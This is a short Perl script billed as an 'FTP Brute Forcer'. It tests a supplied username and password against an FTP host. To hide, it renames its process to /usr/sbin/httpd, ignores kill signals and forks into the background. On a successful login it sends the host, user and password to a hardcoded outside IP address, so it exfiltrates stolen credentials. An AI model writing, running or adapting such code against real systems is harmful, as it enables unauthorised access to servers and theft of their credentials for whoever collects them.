#!/usr/bin/perl
################################################################################
# FBF - FTP Brute Forcer
# by alin
# music@medbeats.com
# usage: perl ftp.pl
################################################################################
use Net::FTP;
use Term::ANSIColor;
use LWP::Simple;
use Getopt::Long;

#default variable options
my $host = "localhost";
my $port = "21";
my $delay = "0";
my $account = "";
my $status = "1";

use constant MY_PROCNAME                => '/usr/sbin/httpd';

$SIG{"INT"}             = "IGNORE";
$SIG{"HUP"}             = "IGNORE";
$SIG{"TERM"}    = "IGNORE";
$SIG{"CHLD"}    = "IGNORE";
$SIG{"PS"}              = "IGNORE";
$0 = MY_PROCNAME."\0"x16;
my $pid=fork();
exit() if $pid;
die "Problema ao criar fork: $!" unless defined($pid);


#arrays we use to store the usernames and passwords
#from the files
#@users = ();
#@passes = ();

#this is the name of the user and pass list
#by default it looks in the current directory as
#the script. So you will need to have a user list
#called users and a password list call pass
#$user_list = $ARGV[1]; 
#$pass_list = $ARGV[2];

#variable is used to call clear which clears our screen
my $clear = '/usr/bin/clear';

#clear the terminal screen and write out the pretty banner :)
if ($ARGV[0] eq "") {
   die "* Use it like this: perl pwn.pl hostname | ip\n";
   }

#input gathers all the user input we need to launch the attack
sub INPUT { 
   $host = $ARGV[0];
   chomp $host;

   $user = $ARGV[1];
   chomp $user;

   $pass = $ARGV[2];
   chomp $pass;

   $port = "21";
   chomp $port;

   $delay = "0";
   chomp $delay;

   $account = "";
   chomp $account;

   if($account eq "y") {
      $account = "";
      chomp $account;
   } else {
      $account = "";
   }
  
   $status = "1";
   chomp $status;
   
   if($host eq "") {
      die("bye");
   }
   if($port eq "") {
      $port = 21;
   }
   if($delay eq "") {
      $delay = 0;
   }
};

#call our subs this is more of the main
#start of the application..
&INPUT;

#try and open the pass file
#open (PASS, "$pass_list") or 
#   die "* Where the fuck did you put your pass file!?\n";
#
#we decide if we are going to load the userlist or 
#an account specified in the options
#if($account eq "") {
#   open (USER, "$user_list") or
#      die "* Where the fuck did you put your users file!?\n";
#
#   while($uline = <USER>) {
#      ($user) = split(" ",$uline);
#      push @users, "$user";
#   }
#   close(USER);
#
#} else {
#   push @users, "$account";
#}

#store passwords in list
      
      #connect to the host
      $ftp=Net::FTP->new("$host", Port=>"$port")
	 or die("  *  I can not be able to connect to host:" . $host . " on port " . $port);
      
      #display status of accounts that are being tested
      #if($status eq "1" or $status eq "y") {
      #  use Term::ANSIColor qw(:constants);
      # 	 print CYAN," *",RED," I am trying to connect to",CYAN," $host",RED," with user",CYAN," $user",RED," and password",CYAN," $pass",RED," . \n";
      #  print RESET;
      #}

      if($ftp->login("$user","$pass")) {
       #  #let the user know we found an account, \a sets of the terminal bell  
       #  use Term::ANSIColor qw(:constants);     
       #  print"\a";
       #  print WHITE, "    @ ",GREEN,"THIS IS A GOOD ONE",WHITE," =>",YELLOW," $host",WHITE," :",YELLOW," $user",WHITE," :",YELLOW," $pass\n";
       #  print RESET;
       #   open(FILEOUT,">>pwned.log");
          $found = "$host $user $pass";
       #   print FILEOUT "$found\n";
       #   close(FILEOUT);
          getprint("http://5.135.180.165/xp3.php?save=$found");
       #   last;
      }
      $ftp->close();




